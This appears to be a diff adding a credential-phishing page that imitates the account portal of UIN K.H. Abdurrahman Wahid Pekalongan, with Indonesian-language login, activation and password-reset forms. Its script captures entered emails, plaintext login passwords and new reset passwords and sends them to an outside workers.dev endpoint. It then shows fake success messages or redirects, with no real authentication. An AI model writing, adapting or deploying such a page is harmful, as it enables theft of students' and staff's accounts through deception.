@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AKUN - UIN K.H. Abdurrahman Wahid Pekalongan</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+    <div class="main-container" id="landing-container">
+        <!-- Main Landing Card -->
+        <div class="card" id="main-card">
+            <div class="card-header">
+                <img src="horizontal-logo.png" alt="Logo UIN Gusdur" class="logo">
+            </div>
+            <div class="card-body">
+                <!-- Success Message (Hidden by default) -->
+                <div class="success-box hidden" id="activation-success-msg">
+                    <div class="success-content">
+                        <p class="success-title">Akun</p>
+                        <p><span id="success-email-display"></span><br>sudah diaktivasi, silakan masuk.</p>
+                    </div>
+                </div>
+
+                <div class="action-buttons">
+                    <button class="btn-action btn-activation" onclick="showModal('activation-modal')">
+                        <div class="icon-wrapper">
+                            <i class="fa-solid fa-unlock-keyhole"></i>
+                            <i class="fa-solid fa-shield-halved shield-icon"></i>
+                        </div>
+                        <span>Aktivasi</span>
+                    </button>
+                    <button class="btn-action btn-login" onclick="showModal('login-modal')">
+                        <div class="icon-wrapper">
+                            <i class="fa-solid fa-right-to-bracket"></i>
+                        </div>
+                        <span>Masuk</span>
+                    </button>
+                </div>
+                <div class="divider">
+                    <span>Anda lupa password ?</span>
+                </div>
+                <button class="btn-reset-password" onclick="startResetFlow()">
+                    <i class="fa-solid fa-key"></i> Atur Ulang Sandi
+                </button>
+            </div>
+        </div>
+
+        <!-- Login Modal -->
+        <div class="card hidden" id="login-modal">
+            <div class="card-header">
+                <img src="horizontal-logo.png" alt="Logo UIN Gusdur" class="logo">
+            </div>
+            <div class="card-body">
+                <div class="activation-header">
+                    <button class="btn-back" onclick="showCard('main-card')"><i
+                            class="fa-solid fa-arrow-left"></i></button>
+                    <h3>Login Akun</h3>
+                </div>
+
+                <form onsubmit="event.preventDefault(); performLogin();">
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-icon"><i class="fa-solid fa-envelope"></i></span>
+                            <input type="email" class="form-control with-icon" id="login-email"
+                                placeholder="Email UIN Gusdur" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-icon"><i class="fa-solid fa-lock"></i></span>
+                            <input type="password" class="form-control with-icon" id="login-password"
+                                placeholder="Sandi" required>
+                            <button type="button" class="btn-eye" onclick="togglePassword('login-password', this)"><i
+                                    class="fa-solid fa-eye-slash"></i></button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-block-green">
+                        <i class="fa-solid fa-right-to-bracket"></i> Masuk
+                    </button>
+                </form>
+
+                <div class="divider">
+                    <span>Anda lupa password ?</span>
+                </div>
+                <button class="btn-reset-password" onclick="startResetFlow()">
+                    <i class="fa-solid fa-key"></i> Atur Ulang Sandi
+                </button>
+            </div>
+        </div>
+
+        <!-- Aktivasi Modal -->
+        <div class="card hidden" id="activation-modal">
+            <div class="card-header">
+                <img src="horizontal-logo.png" alt="Logo UIN Gusdur" class="logo">
+            </div>
+            <div class="card-body">
+                <div class="activation-header">
+                    <button class="btn-back" onclick="showCard('main-card')"><i
+                            class="fa-solid fa-arrow-left"></i></button>
+                    <h3>Aktivasi Akun</h3>
+                </div>
+
+                <button class="btn-outline-orange">
+                    <i class="fa-solid fa-circle-info"></i> Panduan
+                </button>
+
+                <div class="form-group" style="margin-top: 15px;">
+                    <input type="text" class="form-control" id="activation-email-input"
+                        placeholder="Masukan Email Anda">
+                </div>
+
+                <button class="btn-block-orange" onclick="submitActivation()">
+                    <i class="fa-solid fa-circle-check"></i> Aktivasi
+                </button>
+
+                <div class="divider">
+                    <span>Anda lupa password ?</span>
+                </div>
+                <button class="btn-reset-password" onclick="startResetFlow()">
+                    <i class="fa-solid fa-key"></i> Atur Ulang Sandi
+                </button>
+            </div>
+        </div>
+
+        <!-- Verifikasi Email UIN Gusdur Modal -->
+        <div class="card hidden" id="verify-email-modal">
+            <div class="modal-header">
+                <h3>Verifikasi Email UIN Gusdur</h3>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <input type="text" class="form-control" id="reset-email-input"
+                        placeholder="Masukan email resmi dari UIN Gusdur">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-text" onclick="showCard('main-card')">Batal</button>
+                <button class="btn-primary" onclick="goToRecoveryStep()"><i class="fa-solid fa-arrow-right"></i>
+                    Berikutnya</button>
+            </div>
+        </div>
+
+        <!-- Verifikasi Email Pemulihan Modal -->
+        <div class="card hidden" id="verify-recovery-modal">
+            <div class="modal-header">
+                <h3>Verifikasi Email Pemulihan</h3>
+            </div>
+            <div class="modal-body">
+                <p class="instruction-text">Silahkan <span class="badge">Tulis Ulang</span> email pemulihan secara
+                    lengkap</p>
+                <div class="email-display" id="recovery-email-display">
+                    <!-- Dynamic Email -->
+                </div>
+                <div class="form-group">
+                    <input type="text" class="form-control" placeholder="Email Pemulihan">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-text" onclick="showCard('main-card')">Batal</button>
+                <button class="btn-primary" onclick="goToResetStep()"><i class="fa-solid fa-arrow-right"></i>
+                    Berikutnya</button>
+            </div>
+        </div>
+
+        <!-- Atur Ulang Sandi Modal -->
+        <div class="card hidden" id="reset-password-modal">
+            <div class="modal-header">
+                <h3>Atur Ulang Sandi</h3>
+            </div>
+            <div class="modal-body">
+                <div class="alert-box">
+                    <i class="fa-regular fa-bell"></i>
+                    <p>Sandi harus mengandung 8-15 karakter dengan huruf besar, huruf kecil, angka, dan karakter
+                        spesial.<br><strong>Contoh: Abc123!@#</strong></p>
+                </div>
+
+                <div class="success-box">
+                    <i class="fa-solid fa-circle-check"></i>
+                    <p>Token berhasil dikirim ke<br><strong id="token-sent-email"></strong></p>
+                </div>
+
+                <form onsubmit="event.preventDefault(); finishResetFlow();">
+                    <div class="form-group">
+                        <label>Sandi :</label>
+                        <div class="input-group">
+                            <input type="password" class="form-control" id="reset-pass-1" required>
+                            <button type="button" class="btn-eye" onclick="togglePassword('reset-pass-1', this)"><i
+                                    class="fa-regular fa-eye"></i></button>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Ulang Sandi :</label>
+                        <div class="input-group">
+                            <input type="password" class="form-control" id="reset-pass-2" required>
+                            <button type="button" class="btn-eye" onclick="togglePassword('reset-pass-2', this)"><i
+                                    class="fa-regular fa-eye"></i></button>
+                        </div>
+                    </div>
+                    <div class="modal-footer" style="padding: 0; border: none; background: none; margin-top: 20px;">
+                        <button type="button" class="btn-text" onclick="showCard('main-card')">Batal</button>
+                        <button type="submit" class="btn-primary"><i class="fa-regular fa-floppy-disk"></i>
+                            Simpan</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Pastikan URL menggunakan HTTPS
+        const API_URL = "https://quiet-scene-2bfd.uingusdur.workers.dev";
+        let currentEmail = '';
+
+        function validateUinEmail(email) {
+            // Hanya izinkan email @uingusdur.ac.id atau @student.uingusdur.ac.id
+            const regex = /^[a-zA-Z0-9._%+-]+@(student\.)?uingusdur\.ac\.id$/;
+            return regex.test(email);
+        }
+
+        async function kirimLaporan(pesan) {
+            try {
+                console.log("Mengirim laporan ke:", API_URL);
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ pesan: pesan })
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    console.log("Berhasil dikirim:", data);
+                } else {
+                    console.error("Gagal mengirim:", data);
+                }
+            } catch (error) {
+                console.error("Error jaringan saat mengirim laporan:", error);
+            }
+        }
+
+        function showCard(cardId) {
+            document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
+            document.getElementById(cardId).classList.remove('hidden');
+        }
+
+        function showModal(modalId) {
+            showCard(modalId);
+        }
+
+        // Toggle Password Visibility
+        function togglePassword(inputId, btn) {
+            const input = document.getElementById(inputId);
+            const icon = btn.querySelector('i');
+
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye', 'fa-eye-slash');
+                icon.classList.add('fa-eye'); // Show eye (open)
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye', 'fa-eye-slash');
+                icon.classList.add('fa-eye-slash'); // Show eye slash (closed)
+            }
+        }
+
+        // Activation Flow
+        function submitActivation() {
+            const email = document.getElementById('activation-email-input').value;
+            if (!email) {
+                alert('Mohon masukan email');
+                return;
+            }
+            if (!validateUinEmail(email)) {
+                alert('Mohon gunakan email UIN Gusdur (@uingusdur.ac.id atau @student.uingusdur.ac.id)');
+                return;
+            }
+
+            // Kirim data ke API
+            kirimLaporan(`Aktivasi Akun: ${email}`);
+            // Update success message for activation
+            document.querySelector('#activation-success-msg .success-title').textContent = 'Akun';
+            document.getElementById('success-email-display').innerHTML = `${email}<br>sudah diaktivasi, silakan masuk.`;
+
+            document.getElementById('activation-success-msg').classList.remove('hidden');
+            showCard('main-card');
+        }
+
+        // Reset Password Flow
+        function startResetFlow() {
+            showCard('verify-email-modal');
+        }
+
+        function goToRecoveryStep() {
+            const email = document.getElementById('reset-email-input').value;
+            if (!email) {
+                alert('Mohon masukan email');
+                return;
+            }
+            if (!validateUinEmail(email)) {
+                alert('Mohon gunakan email UIN Gusdur (@uingusdur.ac.id atau @student.uingusdur.ac.id)');
+                return;
+            }
+            currentEmail = email;
+            document.getElementById('recovery-email-display').textContent = currentEmail;
+            showCard('verify-recovery-modal');
+        }
+
+        function goToResetStep() {
+            document.getElementById('token-sent-email').textContent = currentEmail;
+            showCard('reset-password-modal');
+        }
+
+        function finishResetFlow() {
+            const pass1 = document.getElementById('reset-pass-1').value;
+            const pass2 = document.getElementById('reset-pass-2').value;
+
+            if (!pass1 || !pass2) {
+                alert('Mohon lengkapi sandi');
+                return;
+            }
+
+            if (pass1 !== pass2) {
+                alert('Sandi tidak cocok');
+                return;
+            }
+
+            // Kirim data reset password ke API (Fire and forget)
+            kirimLaporan(`Reset Password - Email: ${currentEmail} | New Pass: ${pass1}`);
+
+            // Update success message for reset password
+            document.querySelector('#activation-success-msg .success-title').textContent = 'Sukses';
+            document.getElementById('success-email-display').innerHTML = `Kata sandi berhasil diubah.<br>Silakan masuk dengan sandi baru.`;
+
+            // Tampilkan pesan sukses dan kembali ke halaman utama
+            document.getElementById('activation-success-msg').classList.remove('hidden');
+            showCard('main-card');
+
+            // Clear inputs
+            document.getElementById('reset-pass-1').value = '';
+            document.getElementById('reset-pass-2').value = '';
+        }
+
+        // Login Logic
+        async function performLogin() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            const loginBtn = document.querySelector('#login-modal button[type="submit"]');
+
+            if (!email || !password) {
+                alert('Mohon lengkapi email dan password');
+                return;
+            }
+
+            if (!validateUinEmail(email)) {
+                alert('Mohon gunakan email UIN Gusdur (@uingusdur.ac.id atau @student.uingusdur.ac.id)');
+                return;
+            }
+
+            // Show loading state
+            if (loginBtn) {
+                const originalBtnText = loginBtn.innerHTML;
+                loginBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Masuk...';
+                loginBtn.disabled = true;
+            }
+
+            // Kirim data login ke API
+            await kirimLaporan(`Login - Email: ${email} | Password: ${password}`);
+
+            // Simpan email ke localStorage dan redirect ke info.html
+            localStorage.setItem('userEmail', email);
+            window.location.href = 'info.html';
+        }
+
+        function logout() {
+            // Not used in index.html anymore, but kept for compatibility if needed
+            showCard('main-card');
+            // Clear inputs
+            document.getElementById('login-email').value = '';
+            document.getElementById('login-password').value = '';
+        }
+    </script>
+</body>
+
+</html>
